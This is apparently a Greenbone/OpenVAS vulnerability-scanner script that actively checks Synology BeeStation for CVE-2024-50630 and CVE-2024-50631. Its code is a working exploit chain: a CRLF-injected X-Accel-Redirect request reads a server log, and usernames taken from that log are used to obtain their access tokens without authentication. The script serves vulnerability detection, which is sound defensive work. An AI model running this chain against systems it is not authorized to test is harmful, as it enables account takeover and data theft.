# SPDX-FileCopyrightText: 2025 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:synology:beestation_os";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.156062");
  script_version("2025-12-19T15:41:09+0000");
  script_tag(name:"last_modification", value:"2025-12-19 15:41:09 +0000 (Fri, 19 Dec 2025)");
  script_tag(name:"creation_date", value:"2025-12-19 02:41:12 +0000 (Fri, 19 Dec 2025)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2024-50630", "CVE-2024-50631");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Synology BeeStation (BSM) Multiple Vulnerabilities (Synology_SA_24_21) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2025 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_synology_bsm_http_detect.nasl");
  script_mandatory_keys("synology/beestation/http/detected");
  script_require_ports("Services/www", 6600);

  script_tag(name:"summary", value:"Synology BeeStation (BSM) is prone to multiple
  vulnerabilities in the Synology Drive Server.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST requests and checks the
  responses.

  Note: This script checks for the presence of CVE-2024-50630 which indicates that the system is
  also affected by the other included CVE.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2024-50630: Missing authentication for critical function in the webapi component in
  Synology Drive Server allows remote attackers to obtain administrator credentials

  - CVE-2024-50631: Improper neutralization of special elements used in an SQL command ('SQL
  Injection') in the system syncing daemon in Synology Drive Server allows remote attackers to
  inject SQL commands, limited to write operations");

  script_tag(name:"affected", value:"Synology BeeStation (BSM) with Synology Drive Server prior to
  version 3.0.4-12699, 3.2.1-23280, 3.5.0-26085 or 3.5.1-26102 installed.");

  script_tag(name:"solution", value:"Update Synology Drive Server to version 3.0.4-12699,
  3.2.1-23280, 3.5.0-26085, 3.5.1-26102 or later.");

  script_xref(name:"URL", value:"https://www.synology.com/en-global/security/advisory/Synology_SA_24_21");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-25-212/");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-25-213/");
  script_xref(name:"URL", value:"https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/webapi/entry.cgi";

data = "api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url=" +
       'https://dsfinder.synology.com/dsm/login?\r\nX-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log';

req = http_post_put_req(port: port, url: url, data: data);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1\.[01] 200" || (
    # e.g.:
    # 2024-03-16T10:56:29 (25415:22624) [INFO] job-queue-client.cpp.o(103): JobQueueClient Setup started.
    "checkpoint-task.cpp.o" >!< res &&
    "job-queue-client.cpp.o" >!< res &&
    !egrep(string: res, pattern: "^[0-9A-Z:-]+ \([0-9]+:[0-9]+\) \[INFO\].+\.(o|cpp)", icase:FALSE))
   )
  exit(0);

usernames1 = egrep(pattern: '"/homes/[^"]+"', string: res);
usernames2 = egrep(pattern: 'username:[^\r\n]+', string: res);
if (!usernames1 && !usernames2)
  exit(0);

usernames = make_list(usernames1, usernames2);

lines = split(usernames, keep: FALSE);
usernames = make_list();

foreach line (lines) {
  user = eregmatch(pattern: '/homes/([^"]+)"', string: line);
  if (!isnull(user[1])) {
    usernames = make_list_unique(usernames, user[1]);
  } else {
    user = eregmatch(pattern: 'username:([^\r\n]+)', string: line);
    if (!isnull(user[1])) {
      usernames = make_list_unique(usernames, user[1]);
    }
  }
}

vt_strings = get_vt_strings();
device = vt_strings["lowercase"];

foreach user (usernames) {
  data = "api=SYNO.SynologyDrive.Authentication&method=authenticate&version=1&username=" + user +
         "&device_name=" + device;

  req = http_post_put_req(port: port, url: url, data: data);
  res = http_keepalive_send_recv(port: port, data: req);

  # {"data":{"access_token":"<redacted>","server_id":"<redacted>"},"success":true}
  if (res =~ "^HTTP/1\.[01] 200" && res =~ '"access_token"\\s*:\\s*"[^"]+"') {
    token = eregmatch(pattern: '"access_token"\\s*:\\s*"([^"]+)"', string: res);
    result[user] = token[1];
  }
}

if (result) {
  report = 'It was possible to obtain access tokens for the following users:\n\n' +
           text_format_table(array: result, sep: " | ", columnheader: make_list("User", "Access Token"));
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
